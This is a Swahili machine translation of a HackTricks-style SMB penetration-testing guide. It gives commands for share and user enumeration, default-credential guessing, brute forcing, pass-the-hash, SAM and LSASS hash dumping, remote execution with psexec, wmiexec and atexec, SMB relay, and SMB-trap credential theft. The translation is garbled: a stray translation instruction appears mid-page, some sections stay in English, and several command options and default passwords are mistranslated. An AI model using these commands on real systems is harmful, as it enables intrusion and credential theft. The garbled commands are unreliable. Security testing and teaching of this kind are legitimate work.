# 139,445 - Kupima Usalama wa SMB

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## **Bandari 139**

**_Network Basic Input Output System_ (NetBIOS)** ni itifaki ya programu iliyoundwa kuruhusu programu, PC, na Desktops ndani ya mtandao wa eneo la karibu (LAN) kuingiliana na vifaa vya mtandao na **kurahisisha uhamishaji wa data kwenye mtandao**. Kitambulisho na mahali pa programu za programu zinazofanya kazi kwenye mtandao wa NetBIOS hufikiwa kupitia majina yao ya NetBIOS, ambayo yanaweza kuwa na herufi 16 na mara nyingi ni tofauti na jina la kompyuta. Kikao cha NetBIOS kati ya programu mbili huanzishwa wakati programu moja (inayofanya kazi kama mteja) inatoa amri ya "kuita" programu nyingine (inayofanya kazi kama seva) kwa kutumia **Bandari ya TCP 139**.
```
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
```
## Bandari 445

Kiteknolojia, Bandari 139 inajulikana kama 'NBT juu ya IP', wakati Bandari 445 inatambuliwa kama 'SMB juu ya IP'. Kifupisho **SMB** kina maana ya '**Server Message Blocks**', ambayo pia inajulikana kwa sasa kama **Common Internet File System (CIFS)**. Kama itifaki ya mtandao wa safu ya maombi, SMB/CIFS hutumiwa kwa kiasi kikubwa kuwezesha ufikiaji wa pamoja wa faili, printa, bandari za serial, na kurahisisha aina mbalimbali za mawasiliano kati ya vifaa kwenye mtandao.

Kwa mfano, katika muktadha wa Windows, inasisitizwa kuwa SMB inaweza kufanya kazi moja kwa moja juu ya TCP/IP, ikiondoa haja ya NetBIOS juu ya TCP/IP, kupitia matumizi ya bandari 445. Kwa upande mwingine, kwenye mifumo tofauti, matumizi ya bandari 139 yanazingatiwa, ikionyesha kuwa SMB inatekelezwa pamoja na NetBIOS juu ya TCP/IP.
```
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
```
### SMB

Itifaki ya **Server Message Block (SMB)**, ikifanya kazi katika mfano wa **mteja-seva**, imeundwa kwa ajili ya kudhibiti **upatikanaji wa faili**, saraka, na rasilimali nyingine za mtandao kama vile wachapishaji na router. Kwa kawaida hutumiwa katika mfumo wa uendeshaji wa **Windows**, SMB inahakikisha utangamano wa nyuma, kuruhusu vifaa vyenye toleo jipya la mfumo wa uendeshaji wa Microsoft kuwasiliana kwa urahisi na vile vilivyokuwa na toleo la zamani. Kwa kuongezea, mradi wa **Samba** hutoa suluhisho la programu huria, kuruhusu utekelezaji wa SMB kwenye mifumo ya **Linux** na Unix, hivyo kuwezesha mawasiliano kati ya majukwaa mbalimbali kupitia SMB.

Sehemu, zinazowakilisha **sehemu za hiari za mfumo wa faili wa ndani**, zinaweza kutolewa na seva ya SMB, ikifanya muundo uonekane kwa mteja kwa sehemu **isiyo tegemezi** na muundo halisi wa seva. **Orodha za Kudhibiti Upatikanaji (ACLs)**, zinazofafanua **haki za upatikanaji**, huruhusu udhibiti wa kina wa ruhusa za mtumiaji, ikiwa ni pamoja na sifa kama vile **`utekelezaji`**, **`kusoma`**, na **`upatikanaji kamili`**. Ruhusa hizi zinaweza kupewa watumiaji binafsi au vikundi, kulingana na sehemu, na ni tofauti na ruhusa za ndani zilizowekwa kwenye seva.

### Sehemu ya IPC$

Upatikanaji wa sehemu ya IPC$ unaweza kupatikana kupitia kikao cha null cha kutotambulika, kuruhusu mwingiliano na huduma zilizofichuliwa kupitia mabomba yenye majina. Zana ya `enum4linux` ni muhimu kwa kusudi hili. Ikitumiwa ipasavyo, inawezesha kupata:

- Taarifa kuhusu mfumo wa uendeshaji
- Maelezo kuhusu kikoa cha mzazi
- Orodha ya watumiaji na vikundi vya ndani
- Taarifa kuhusu sehemu za SMB zilizopo
- Sera ya usalama ya mfumo inayotumika

Uwezo huu ni muhimu kwa watawala wa mtandao na wataalamu wa usalama kwa ajili ya kutathmini hali ya usalama wa huduma za SMB (Server Message Block) kwenye mtandao. `enum4linux` hutoa mtazamo kamili wa mazingira ya SMB ya mfumo unaolengwa, ambayo ni muhimu kwa kutambua udhaifu unaowezekana na kuhakikisha kuwa huduma za SMB zimehakikishiwa vizuri.
```bash
enum4linux -a target_ip
```
Amri iliyotajwa hapo juu ni mfano wa jinsi `enum4linux` inaweza kutumika kufanya uchunguzi kamili dhidi ya lengo lililoelezwa na `target_ip`.


## NTLM ni nini

Ikiwa haujui NTLM au unataka kujua jinsi inavyofanya kazi na jinsi ya kuitumia vibaya, utapata ukurasa huu kuhusu **NTLM** kuwa wa kuvutia sana ambapo imeelezewa **jinsi itifaki hii inavyofanya kazi na jinsi unavyoweza kunufaika nayo:**

{% content-ref url="../windows-hardening/ntlm/" %}
[ntlm](../windows-hardening/ntlm/)
{% endcontent-ref %}

## **Uchunguzi wa Seva**

### **Tafuta** mtandao ukitafuta watumiaji:
```bash
nbtscan -r 192.168.0.1/24
```
### Toleo la seva ya SMB

Ili kutafuta udhaifu unaowezekana kwenye toleo la SMB, ni muhimu kujua ni toleo gani linalotumiwa. Ikiwa habari hii haionekani kwenye zana zingine zilizotumiwa, unaweza:

* Tumia moduli ya ziada ya **MSF** \_**auxiliary/scanner/smb/smb\_version**
* Au tumia script hii:
```bash
#!/bin/sh
#Author: rewardone
#Description:
# Requires root or enough permissions to use tcpdump
# Will listen for the first 7 packets of a null login
# and grab the SMB Version
#Notes:
# Will sometimes not capture or will print multiple
# lines. May need to run a second time for success.
if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
echo "" && sleep .1
```
### **Tafuta udhaifu**

Kutafuta udhaifu ni hatua muhimu katika mchakato wa kuingilia kati kwenye mtandao. Udhaifu unaweza kutokea katika huduma mbalimbali za mtandao, kama vile SMB (Server Message Block). Kwa kutumia zana za kutafuta udhaifu, unaweza kugundua ikiwa kuna udhaifu wowote uliojulikana katika huduma ya SMB na kutumia udhaifu huo kuingia kwenye mfumo.

Kuna zana nyingi za kutafuta udhaifu zinazopatikana, kama vile Metasploit, Nmap, na Nessus. Zana hizi zinaweza kutumika kutafuta udhaifu katika huduma ya SMB na kutoa matokeo yanayoweza kutumiwa kwa hatua zaidi za kuingilia kati.

Kumbuka kuwa kutafuta udhaifu katika huduma ya SMB bila idhini ya mmiliki wa mfumo ni kinyume cha sheria na inaweza kusababisha mashtaka ya kisheria. Ni muhimu kufuata sheria na kanuni zinazohusiana na kuingilia kati kwenye mtandao.
```bash
msf> search type:exploit platform:windows target:2008 smb
searchsploit microsoft smb
```
### **Inawezekana** Kujiuliza

| **Jina la mtumiaji** | **Nenosiri za kawaida**                    |
| -------------------- | ----------------------------------------- |
| _(blank)_            | _(blank)_                                 |
| mgeni                | _(blank)_                                 |
| Msimamizi, admin     | _(blank)_, nenosiri, msimamizi, admin     |
| arcserve             | arcserve, chelezo                         |
| tivoli, tmersrvd     | tivoli, tmersrvd, admin                   |
| backupexec, backup   | backupexec, chelezo, arcada               |
| jaribio, maabara, demo | nenosiri, jaribio, maabara, demo           |

### Kuvunja Nguvu

* [**Kuvunja Nguvu SMB**](../generic-methodologies-and-resources/brute-force.md#smb)

### Taarifa za Mazingira ya SMB

### Kupata Taarifa
```bash
#Dump interesting information
enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>
nmap --script "safe or smb-enum-*" -p 445 <IP>

#Connect to the rpc
rpcclient -U "" -N <IP> #No creds
rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
rpcclient -U "username%passwd" <IP> #With creds
#You can use querydispinfo and enumdomusers to query user information

#Dump user information
/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]<targetName or address>

#Map possible RPC endpoints
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]<targetName or address>
```
### Kagua Watumiaji, Vikundi na Watumiaji Walioingia

Maelezo haya yanapaswa tayari kukusanywa kutoka kwa enum4linux na enum4linux-ng
```bash
crackmapexec smb 10.10.10.10 --users [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups --loggedon-users [-u <username> -p <password>]

ldapsearch -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "(&(objectclass=user))" -h 10.10.10.10 | grep -i samaccountname: | cut -f 2 -d " "

rpcclient -U "" -N 10.10.10.10
enumdomusers
enumdomgroups
```
### Tafuta watumiaji wa ndani

[Impacket](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py)
```bash
lookupsid.py -no-pass hostname.local
```
Hii ni nakala kutoka kwenye kitabu cha kuhack teknolojia kuhusu mbinu za kuhack. Nakala ifuatayo ni kutoka kwenye faili /hive/hacktricks/network-services-pentesting/pentesting-smb.md. Tafsiri sehemu muhimu ya maandishi ya Kiingereza kuwa Kiswahili na irudishe tafsiri hiyo bila kubadilisha muundo wa markdown na html. Usitafsiri vitu kama nambari, majina ya mbinu za kuhack, maneno ya kuhack, majina ya jukwaa la wingu/SaaS (kama Workspace, aws, gcp...), neno 'leak', pentesting, na vitambulisho vya markdown. Pia usiongeze chochote zaidi ya tafsiri na muundo wa markdown.
```bash
for i in $(seq 500 1100);do rpcclient -N -U "" 10.10.10.10 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```
### Metasploit - Kuchunguza watumiaji wa ndani

Metasploit ni chombo maarufu cha kufanya uchunguzi wa usalama na kuvamia mifumo ya kompyuta. Moja ya kazi zake ni kuchunguza watumiaji wa ndani kwenye mfumo wa kompyuta uliolengwa. Hapa chini ni hatua za kufanya hivyo kwa kutumia Metasploit:

1. Anza Metasploit Framework kwa kuingiza amri ifuatayo:

   ```
   msfconsole
   ```

2. Tumia moduli ya `enum_users` kuchunguza watumiaji wa ndani. Ingiza amri ifuatayo:

   ```
   use auxiliary/scanner/smb/enum_users
   ```

3. Weka anwani ya IP ya mfumo wa kompyuta uliolengwa kwa kutumia amri ifuatayo:

   ```
   set RHOSTS <anwani ya IP>
   ```

4. Kuanza kuchunguza watumiaji wa ndani, ingiza amri ifuatayo:

   ```
   run
   ```

5. Metasploit itaanza kuchunguza watumiaji wa ndani kwenye mfumo wa kompyuta uliolengwa. Matokeo yataonyeshwa kwenye skrini.

Kwa kufuata hatua hizi, unaweza kutumia Metasploit kuchunguza watumiaji wa ndani kwenye mfumo wa kompyuta uliolengwa.
```bash
use auxiliary/scanner/smb/smb_lookupsid
set rhosts hostname.local
run
```
### **Kuorodhesha LSARPC na SAMR rpcclient**

{% content-ref url="pentesting-smb/rpcclient-enumeration.md" %}
[rpcclient-enumeration.md](pentesting-smb/rpcclient-enumeration.md)
{% endcontent-ref %}

### Uunganisho wa GUI kutoka kwenye linux

#### Katika terminal:

`xdg-open smb://cascade.htb/`

#### Katika dirisha la kivinjari cha faili (nautilus, thunar, nk)

`smb://friendzone.htb/general/`

## Uchunguzi wa Folda Zilizoshirikiwa

### Orodhesha folda zilizoshirikiwa

Daima ni vyema kuangalia ikiwa unaweza kupata ufikiaji wa chochote, ikiwa huna nyaraka za kuingia, jaribu kutumia **nyaraka za null/mtumiaji wa mgeni**.
```bash
smbclient --no-pass -L //<IP> # Null user
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash

smbmap -H <IP> [-P <PORT>] #Null user
smbmap -u "username" -p "password" -H <IP> [-P <PORT>] #Creds
smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash
smbmap -R -u "username" -p "password" -H <IP> [-P <PORT>] #Recursive list

crackmapexec smb <IP> -u '' -p '' --shares #Null user
crackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user
crackmapexec smb <IP> -u 'username' -H '<HASH>' --shares #Guest user
```
To connect to a shared folder on a remote machine, you can use the `smbclient` tool. This tool allows you to interact with SMB (Server Message Block) shares.

To connect to a shared folder, use the following command:

```plaintext
smbclient //<IP_ADDRESS>/<SHARE_NAME> -U <USERNAME>
```

Replace `<IP_ADDRESS>` with the IP address of the remote machine and `<SHARE_NAME>` with the name of the shared folder you want to connect to. Additionally, replace `<USERNAME>` with a valid username on the remote machine.

Once connected, you can use various commands to interact with the shared folder. For example, you can use the `ls` command to list the contents of the shared folder:

```plaintext
ls
```

This will display a list of files and directories within the shared folder.

Remember to provide valid credentials (username and password) when prompted to authenticate with the remote machine.
```bash
#Connect using smbclient
smbclient --no-pass //<IP>/<Folder>
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient

#List with smbmap, without folder it list everything
smbmap [-u "username" -p "password"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list
smbmap [-u "username" -p "password"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list
smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash
```
### **Kuorodhesha na kuunganisha kwa kushirikiana kwa mikono kwenye Windows**

Inawezekana kuwa umepunguzwa kuonyesha sehemu yoyote ya kompyuta mwenyeji na unapojaribu kuziorodhesha inaonekana kama hakuna sehemu za kuunganisha. Hivyo, inaweza kuwa na maana kujaribu kuunganisha kwa kushirikiana kwa mikono. Kwa kuorodhesha sehemu kwa mikono, unaweza kutafuta majibu kama NT\_STATUS\_ACCESS\_DENIED na NT\_STATUS\_BAD\_NETWORK\_NAME, unapotumia kikao halali (kama kikao tupu au vitambulisho halali). Haya yanaweza kuashiria ikiwa sehemu ipo na huna ruhusa ya kuifikia au sehemu haipo kabisa.

Jina la kawaida la sehemu kwa malengo ya Windows ni

* C$
* D$
* ADMIN$
* IPC$
* PRINT$
* FAX$
* SYSVOL
* NETLOGON

(Jina la kawaida la sehemu kutoka _**Tathmini ya Usalama wa Mtandao toleo la 3**_)

Unaweza kujaribu kuunganisha kwa kutumia amri ifuatayo
```bash
smbclient -U '%' -N \\\\<IP>\\<SHARE> # null session to connect to a windows share
smbclient -U '<USER>' \\\\<IP>\\<SHARE> # authenticated session to connect to a windows share (you will be prompted for a password)
```
au skripti hii (kwa kutumia kikao cha null)
```bash
#/bin/bash

ip='<TARGET-IP-HERE>'
shares=('C$' 'D$' 'ADMIN$' 'IPC$' 'PRINT$' 'FAX$' 'SYSVOL' 'NETLOGON')

for share in ${shares[*]}; do
output=$(smbclient -U '%' -N \\\\$ip\\$share -c '')

if [[ -z $output ]]; then
echo "[+] creating a null session is possible for $share" # no output if command goes through, thus assuming that a session was created
else
echo $output # echo error message (e.g. NT_STATUS_ACCESS_DENIED or NT_STATUS_BAD_NETWORK_NAME)
fi
done
```
**SMB (Server Message Block)** ni itifaki ya mtandao inayotumiwa kwa kushirikiana na kushirikiana faili, vifaa vya kuchapisha, na huduma zingine kwenye mtandao. Ni sehemu muhimu ya mazingira ya Windows na hutumiwa sana katika mazingira ya biashara.

Kwa kufanya pentesting kwenye SMB, unaweza kuchunguza na kuchunguza udhaifu katika mfumo wa SMB. Hii inaweza kujumuisha kuchunguza mbinu za kuingilia kati, kuchunguza vibali dhaifu, na kuchunguza mbinu za kuvunja nywila.

Baadhi ya njia za kuingilia kati kwenye SMB ni pamoja na kutumia mbinu za kuingilia kati za mtu wa kati, kama vile kusikiliza trafiki ya SMB na kubadilisha au kuchanganua data iliyopitishwa. Pia, unaweza kujaribu kuvunja nywila za akaunti za SMB kwa kutumia mbinu kama vile kushambulia nguvu ya nywila au kutumia orodha ya nywila za kawaida.

Kwa kuchunguza vibali dhaifu, unaweza kujaribu kufikia faili au folda ambazo haupaswi kuwa na ufikiaji. Hii inaweza kujumuisha kuchunguza vibali vya faili na folda, kama vile kusoma, kuandika, na kutekeleza vibali.

Kwa kufanya pentesting kwenye SMB, unaweza kugundua udhaifu na kutoa mapendekezo ya kuboresha usalama wa mfumo wa SMB. Hii inaweza kujumuisha kusanidi vibali sahihi, kuboresha mbinu za kuvunja nywila, na kusasisha programu na mifumo ya uendeshaji ili kurekebisha udhaifu uliopo.
```bash
smbclient -U '%' -N \\\\192.168.0.24\\im_clearly_not_here # returns NT_STATUS_BAD_NETWORK_NAME
smbclient -U '%' -N \\\\192.168.0.24\\ADMIN$ # returns NT_STATUS_ACCESS_DENIED or even gives you a session
```
### **Kuorodhesha hisa kutoka kwa Windows / bila zana za tatu**

PowerShell
```powershell
# Retrieves the SMB shares on the locale computer.
Get-SmbShare
Get-WmiObject -Class Win32_Share
# Retrieves the SMB shares on a remote computer.
get-smbshare -CimSession "<computer name or session object>"
# Retrieves the connections established from the local SMB client to the SMB servers.
Get-SmbConnection
```
Konsoli ya CMD
```shell
# List shares on the local computer
net share
# List shares on a remote computer (including hidden ones)
net view \\<ip> /all
```
MMC Snap-in (graphical)

MMC Snap-in (grafiki)
```shell
# Shared Folders: Shared Folders > Shares
fsmgmt.msc
# Computer Management: Computer Management > System Tools > Shared Folders > Shares
compmgmt.msc
```
explorer.exe (grafiki), ingiza `\\<ip>\` kuona hisa zisizofichwa zilizopo.

### Sakinisha folda iliyoshirikiwa
```bash
mount -t cifs //x.x.x.x/share /mnt/share
mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share
```
### **Pakua faili**

Soma sehemu zilizopita ili kujifunza jinsi ya kuunganisha na siri/Pass-the-Hash.
```bash
#Search a file and download
sudo smbmap -R Folder -H <IP> -A <FileName> -q # Search the file in recursive mode and download it inside /usr/share/smbmap
```

```bash
#Download all
smbclient //<IP>/<share>
> mask ""
> recurse
> prompt
> mget *
#Download everything to current directory
```
Amri:

* mask: inaonyesha kichujio kinachotumika kuchuja faili ndani ya saraka (kwa mfano, "" kwa faili zote)
* recurse: inabadilisha hali ya utafutaji wa kina (chaguo-msingi: walemavu)
* prompt: inabadilisha hali ya kuuliza majina ya faili (chaguo-msingi: walemavu)
* mget: inakopi faili zote zinazolingana na kichujio kutoka kwenye mwenyeji kwenda kwenye kifaa cha mteja

(_Maelezo kutoka kwenye ukurasa wa man wa smbclient_)

### Utafutaji wa Folda Zilizoshirikiwa za Kikoa

* [**Snaffler**](https://github.com/SnaffCon/Snaffler)\*\*\*\*
```bash
Snaffler.exe -s -d domain.local -o snaffler.log -v data
```
* [**CrackMapExec**](https://wiki.porchetta.industries/smb-protocol/spidering-shares) ni buibui.
* `-M buibui_plus [--share <jina_la_sehemu>]`
* `--muundo txt`
```bash
sudo crackmapexec smb 10.10.10.10 -u username -p pass -M spider_plus --share 'Department Shares'
```
Hasa ya kuvutia kutoka kwa hisa ni faili zinazoitwa **`Registry.xml`** kwani **zinaweza kuwa na nywila** za watumiaji walioconfigurewa na **autologon** kupitia Sera ya Kikundi. Au faili za **`web.config`** kwani zina siri.

{% hint style="info" %}
Hisia ya **SYSVOL** inaweza **kusomwa** na watumiaji wote waliothibitishwa katika kikoa. Ndani yake unaweza **kupata** hati nyingi tofauti za batch, VBScript, na PowerShell.\
Unapaswa **angalia** hati hizo kwani unaweza **kupata** habari nyeti kama **nywila**.
{% endhint %}

## Soma Usajili

Unaweza kuweza **kusoma usajili** kwa kutumia baadhi ya nywila zilizopatikana. Impacket **`reg.py`** inakuwezesha kujaribu:
```bash
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s
```
## Uchunguzi Baada ya Uvamizi

Mazingira ya msingi ya seva ya **Samba** kawaida hupatikana katika `/etc/samba/smb.conf` na inaweza kuwa na mipangilio hatari ifuatayo:

| **Mipangilio**              | **Maelezo**                                                         |
| --------------------------- | ------------------------------------------------------------------- |
| `browseable = yes`          | Kuruhusu kuorodhesha hisa zilizopo katika hisa ya sasa?              |
| `read only = no`            | Kukataza uundaji na ubadilishaji wa faili?                           |
| `writable = yes`            | Kuruhusu watumiaji kuunda na kubadilisha faili?                      |
| `guest ok = yes`            | Kuruhusu kuunganisha kwenye huduma bila kutumia nenosiri?            |
| `enable privileges = yes`   | Kuheshimu mamlaka zilizopewa SID maalum?                            |
| `create mask = 0777`        | Mamlaka gani yanapaswa kupewa faili zilizoundwa hivi karibuni?       |
| `directory mask = 0777`     | Mamlaka gani yanapaswa kupewa saraka zilizoundwa hivi karibuni?     |
| `logon script = script.sh`  | Ni skripti gani inahitaji kutekelezwa wakati wa kuingia kwa mtumiaji? |
| `magic script = script.sh`  | Ni skripti ipi inapaswa kutekelezwa wakati skripti inafungwa?        |
| `magic output = script.out` | Mahali ambapo matokeo ya skripti ya kichawi yanahitaji kuhifadhiwa?   |

Amri `smbstatus` hutoa habari kuhusu **seva** na kuhusu **nani ameunganishwa**.

## Thibitisha kwa kutumia Kerberos

Unaweza **kuthibitisha** kwa kutumia zana za **smbclient** na **rpcclient**:
```bash
smbclient --kerberos //ws01win10.domain.com/C$
rpcclient -k ws01win10.domain.com
```
## **Kutekeleza Amri**

### **crackmapexec**

crackmapexec inaweza kutekeleza amri kwa kuchangamkia **mmcexec, smbexec, atexec, wmiexec** ambapo **wmiexec** ndio njia ya **chaguo-msingi**. Unaweza kueleza chaguo unayopendelea kutumia kwa kutumia parameter `--exec-method`:
```bash
apt-get install crackmapexec

crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd
crackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami #Pass-the-Hash
# Using --exec-method {mmcexec,smbexec,atexec,wmiexec}

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions #Get sessions (
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --loggedon-users #Get logged-on users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks #Enumerate the disks
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users #Enumerate users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --groups # Enumerate groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --local-groups # Enumerate local groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --pass-pol #Get password policy
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --rid-brute #RID brute

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -H <HASH> #Pass-The-Hash
```
### [**psexec**](../windows-hardening/ntlm/psexec-and-winexec.md)**/**[**smbexec**](../windows-hardening/ntlm/smbexec.md)

Chaguo zote mbili zitafanya **huduma mpya** (kwa kutumia _\pipe\svcctl_ kupitia SMB) katika kompyuta ya mwathirika na kuitumia kutekeleza kitu (**psexec** ita **pakia** faili ya kutekelezeka kwenye sehemu ya ADMIN$ na **smbexec** itaelekeza kwa **cmd.exe/powershell.exe** na kuweka katika hoja mzigo --**njia isiyo na faili-**-).\
**Maelezo zaidi** kuhusu [**psexec** ](../windows-hardening/ntlm/psexec-and-winexec.md)na [**smbexec**](../windows-hardening/ntlm/smbexec.md).\
Katika **kali** iko kwenye /usr/share/doc/python3-impacket/examples/
```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash
```
Kwa kutumia **parameter** `-k` unaweza kuthibitisha utambulisho dhidi ya **kerberos** badala ya **NTLM**

### [wmiexec](../windows-hardening/ntlm/wmicexec.md)/dcomexec

Thibitisha kwa siri kutekeleza kikao cha amri bila kugusa diski au kuendesha huduma mpya kwa kutumia DCOM kupitia **bandari 135**.\
Katika **kali** iko katika /usr/share/doc/python3-impacket/examples/
```bash
#If no password is provided, it will be prompted
./wmiexec.py [[domain/]username[:password]@]<targetName or address> #Prompt for password
./wmiexec.py -hashes LM:NT administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
```
Kwa kutumia **parameter** `-k`, unaweza kujithibitisha dhidi ya **kerberos** badala ya **NTLM**.
```bash
#If no password is provided, it will be prompted
./dcomexec.py [[domain/]username[:password]@]<targetName or address>
./dcomexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
```
### [AtExec](../windows-hardening/ntlm/atexec.md)

Tekeleza amri kupitia Task Scheduler (kwa kutumia _\pipe\atsvc_ kupitia SMB).\
Katika **kali** iko kwenye /usr/share/doc/python3-impacket/examples/
```bash
./atexec.py [[domain/]username[:password]@]<targetName or address> "command"
./atexec.py -hashes <LM:NT> administrator@10.10.10.175 "whoami"
```
## Kumbukumbu ya Impacket

[https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)

## **Kuvunja nguvu siri za watumiaji**

**Hii haipendekezi, unaweza kuzuia akaunti ikiwa utazidi idadi iliyoruhusiwa ya majaribio**
```bash
nmap --script smb-brute -p 445 <IP>
ridenum.py <IP> 500 50000 /root/passwds.txt #Get usernames bruteforcing that rids and then try to bruteforce each user name
```
## Shambulizi la kurejesha SMB

Shambulizi hili linatumia zana ya Responder ku**kukamata vikao vya uthibitishaji wa SMB** kwenye mtandao wa ndani, na kuvirejesha kwenye **mashine ya lengo**. Ikiwa **kikao cha uthibitishaji ni cha mafanikio**, itakuingiza moja kwa moja kwenye **kifaa cha mfumo**.

[**Maelezo zaidi kuhusu shambulizi hili hapa.**](../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

## SMB-Trap

Kivinjari cha Windows URLMon.dll kinajaribu kiotomatiki kuthibitisha kwa mwenyeji wakati ukurasa unajaribu kupata baadhi ya maudhui kupitia SMB, kwa mfano: `img src="\\10.10.10.10\path\image.jpg"`

Hii hutokea na kazi zifuatazo:

* URLDownloadToFile
* URLDownloadToCache
* URLOpenStream
* URLOpenBlockingStream

Ambazo hutumiwa na baadhi ya vivinjari na zana (kama Skype)

![Kutoka: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../.gitbook/assets/image (93).png>)

### SMBTrap kwa kutumia MitMf

![Kutoka: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../.gitbook/assets/image (94).png>)

## Wizi wa NTLM

Kama ilivyo kwa SMB Trapping, kupanda faili zenye nia mbaya kwenye mfumo wa lengo (kupitia SMB, kwa mfano) kunaweza kusababisha jaribio la uthibitishaji wa SMB, kuruhusu hash ya NetNTLMv2 kuwa imekwishwa na zana kama Responder. Hash hiyo kisha inaweza kuvunjwa nje ya mtandao au kutumika katika [shambulizi la kurejesha SMB](pentesting-smb.md#smb-relay-attack).

[Tazama: ntlm\_theft](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#ntlm\_theft)

## Amri za Kiotomatiki za HackTricks
```
Protocol_Name: SMB    #Protocol Abbreviation if there is one.
Port_Number:  137,138,139     #Comma separated if there is more than one.
